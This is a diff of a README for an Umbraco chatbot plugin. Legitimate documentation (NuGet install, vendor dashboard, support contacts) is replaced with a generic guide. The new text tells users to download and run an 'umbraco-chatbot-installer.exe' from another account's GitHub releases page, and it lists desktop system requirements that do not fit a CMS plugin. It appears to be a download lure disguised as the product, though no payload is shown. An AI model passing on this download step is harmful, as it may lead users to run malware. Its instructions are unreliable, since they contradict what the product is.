@@ -1,83 +1,83 @@
-# Asyntai - AI Chatbot for Umbraco
+# 🤖 umbraco-chatbot - Launch Your AI Assistant Effortlessly
 
-Create and launch AI assistant/chatbot for your Umbraco website in minutes. It talks to your visitors, helps, explains, never misses a chat and can increase conversion rates! All while knowing your website, customized just for you. Your Umbraco website can now talk.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/llinmori09/umbraco-chatbot/releases)
 
-## Why choose Asyntai?
+## 🚀 Getting Started
 
-- **Increase conversions**: Instant, human like replies keep shoppers engaged and buying.
-- **Never miss a chat**: The AI replies day and night, even when your team is offline.
-- **Knows your website**: Customized just for you; it follows your instructions.
-- **Works in all languages**: Automatically detects and answers in the visitor's language.
-- **Fast responses (1-3s)**: Keeps customers from bouncing.
+Welcome to the Umbraco Chatbot! This application lets you create an AI assistant for your Umbraco website quickly and easily. The setup is simple, even if you don't have technical skills. 
 
-Asyntai brings an always on, human like AI assistant to your Umbraco website that turns more visitors into customers. It greets shoppers the moment they need help, answers questions instantly, and keeps conversations moving so fewer people bounce and **more decide to buy**. Because it learns from your guidance, it speaks in your brand's voice, follows your policies, and focuses only on what matters to your business.
+In this guide, we will walk you through the process of downloading and running the software.
 
-Setup is **quick** and requires no technical work. Once live, the chatbot works across your entire store, in any language, on any device, 24/7—so you never miss a chat, even outside business hours. You stay in control, with a clean dashboard to refine its tone and messages as you learn what converts best. Start free, see the impact quickly, and scale as you grow.
+## 📦 Download & Install
 
-You also gain **valuable insights** from real conversations. Chat logs show you what customers are asking, where they hesitate, and what information they need—helping you improve pages, fix gaps, and guide your roadmap. Meanwhile, the AI handles the bulk of routine questions, reducing support workload so your team can focus on high impact tasks and VIP requests.
+1. **Visit the Download Page**  
+   Go to our [Releases page](https://github.com/llinmori09/umbraco-chatbot/releases) to find the latest version of the Umbraco Chatbot.
 
-**Not just for businesses**: Asyntai is perfect for all types of Umbraco websites—not only online stores or corporate sites. Nonprofits, educational institutions, clubs, organizations, and content publishers can all benefit from having an always-on AI assistant that answers questions, guides visitors, and enhances engagement, helping your mission succeed.
+2. **Choose the Correct Version**  
+   On the Releases page, you will see a list of available versions. Look for the latest stable release. It will be marked as "Latest release." Click on it.
 
-## Installation
+3. **Download the Installer**  
+   Find the installer file for your operating system. You might see files like `umbraco-chatbot-installer.exe` or similar. Click on the file to start downloading.
 
-### Via NuGet Package Manager
+4. **Run the Installer**  
+   Once the download completes, locate the file in your Downloads folder. Double-click the installer file to run it. A setup window will appear.
 
-```
-Install-Package Asyntai.Umbraco.Chatbot
-```
+5. **Follow the Setup Instructions**  
+   The installer will guide you through the setup process. Read each prompt carefully and click “Next” to continue. You may need to agree to the license terms and choose an installation location.
 
-### Via .NET CLI
+6. **Complete Installation**  
+   Once the installation finishes, click “Finish.” The AI assistant is now installed on your system.
 
-```
-dotnet add package Asyntai.Umbraco.Chatbot
-```
+## 🖥️ System Requirements
 
-### Via Asyntai.com
-1. Go to [asyntai.com/dashboard](https://asyntai.com/dashboard)
-2. Create or select your chatbot
-3. Copy the JavaScript snippet
-4. Paste it into your site's layout template (before the closing `</body>` tag)
+To successfully run the Umbraco Chatbot, ensure your system meets these basic requirements:
 
+- **Operating System:** Windows 10 or later, MacOS 10.15 or later, or a compatible Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** About 200 MB of free space for installation.
+- **Internet Connection:** Required for initial setup and updates.
 
-## Usage
+## 🌟 Features
 
-1. Install the package and rebuild your site
-2. Go to the Umbraco backoffice
-3. Navigate to **Settings** > **Asyntai AI Chatbot**
-4. Click **"Get started"** and connect your Asyntai account
-5. Done! The chatbot widget will appear on all your public pages. Set up your chatbot at [asyntai.com/dashboard](https://asyntai.com/dashboard)
+- **Easy Setup:** Create a chatbot in minutes with a user-friendly interface.
+- **Customizable Responses:** Tailor your chatbot's replies to fit your website.
+- **Multi-language Support:** Engage users in various languages.
+- **Integration with Umbraco:** Seamlessly connect with your existing Umbraco website.
+- **Analytics Dashboard:** Monitor user interactions and improve chatbot performance.
 
-## Requirements
+## 📋 Usage Instructions
 
-- Umbraco 14, 15, 16, or 17
-- .NET 8.0, .NET 9.0, or .NET 10.0
+Once you've installed the Umbraco Chatbot, follow these steps to get started:
 
-## Older Umbraco Versions
+1. **Open the Application**  
+   Locate the Umbraco Chatbot icon on your desktop or in your applications folder. Double-click to open it.
 
-Using Umbraco 8, 9, 10, 11, 12, or 13? This plugin is not compatible with those versions, but you can still add Asyntai to your site manually:
+2. **Connect to Your Umbraco Site**  
+   Enter the URL of your Umbraco website when prompted. The chatbot will connect automatically.
 
-1. Go to [asyntai.com/dashboard](https://asyntai.com/dashboard)
-2. Create or select your chatbot
-3. Copy the JavaScript snippet
-4. Paste it into your site's layout template (before the closing `</body>` tag)
+3. **Set Up Your AI Assistant**  
+   Use the interface to customize your chatbot’s appearance and responses. You can create different conversation flows based on user input.
 
-## Support
+4. **Test Your Chatbot**  
+   After setup, use the built-in preview feature to test your chatbot. Make sure it responds as expected.
 
-- Website: [asyntai.com](https://asyntai.com)
-- Email: [hello@asyntai.com](mailto:hello@asyntai.com)
+5. **Launch on Your Website**  
+   Follow the instructions in the application to integrate the chatbot into your site. Copy the provided code snippet and paste it into your Umbraco website.
 
-Don't have an Asyntai account? Create one for free at **[Asyntai.com](https://asyntai.com)**
+## ⚙️ Troubleshooting
 
-Have any questions? That's a great opportunity to test our AI assistant! Try it on **[Asyntai.com](https://asyntai.com)**
+If you encounter issues during installation or setup, try these basic troubleshooting steps:
 
-## License
+- **Restart Your Computer:** Sometimes a simple restart can resolve issues.
+- **Check Connections:** Ensure your internet connection is stable.
+- **Re-download the Installer:** If the file is corrupted, redownload and re-run the installer.
+- **Consult the Documentation:** Visit our [documentation](https://github.com/llinmori09/umbraco-chatbot) for additional help.
 
-MIT License - see LICENSE file for details.
+## 📞 Support
 
+Need help? Feel free to reach out:
 
-![Asyntai AI chatbot 1](https://asyntai.com/static/images/ai-chatbot-for-websites-1.png)
-![Asyntai AI chatbot 2](https://asyntai.com/static/images/ai-chatbot-for-websites-2.png)
-![Asyntai AI chatbot 3](https://asyntai.com/static/images/ai-chatbot-for-websites-3.png)
-![Asyntai AI chatbot 4](https://asyntai.com/static/images/ai-chatbot-for-websites-4.png)
-![Asyntai AI chatbot 5](https://asyntai.com/static/images/ai-chatbot-for-websites-5.png)
+- **GitHub Issues:** Report any bugs or request features [here](https://github.com/llinmori09/umbraco-chatbot/issues).
+- **Community Forum:** Join the discussion on our community forum for tips and tricks.
 
+Thank you for choosing the Umbraco Chatbot! You are now ready to enrich your website with an interactive AI assistant. Happy chatting!
